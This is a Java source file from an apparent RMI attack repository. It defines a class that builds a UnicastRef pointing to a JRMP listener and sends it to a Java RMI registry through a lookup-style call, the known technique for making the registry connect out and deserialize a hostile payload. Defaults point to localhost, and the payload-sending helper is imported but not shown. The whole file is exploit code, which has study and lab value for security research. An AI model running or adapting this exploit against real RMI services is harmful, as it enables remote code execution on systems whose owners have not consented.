package com.wu.attackRmi.Exploit;

import com.wu.attackRmi.utils.Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.server.ObjID;
import java.util.Random;

public class AttackRegistryByLookupAndUnicastRef {
    public static void main(String[] args) throws Exception{
        String registryHost = "127.0.0.1";
        int registryPort = 1099;
        String JRMPListenHost = "127.0.0.1";
        int JRMPListenPort = 3099;

        attack(registryHost, registryPort, JRMPListenHost, JRMPListenPort);
    }

    public static void attack(String registryHost, int registryPort, String JRMPListenHost, int JRMPListenPort) throws Exception{
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(JRMPListenHost, JRMPListenPort);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        ObjID objID = new ObjID(0);
        Stub.exploit(registryHost, registryPort, ref, objID, 2, 4905912898345647071L);
    }
}
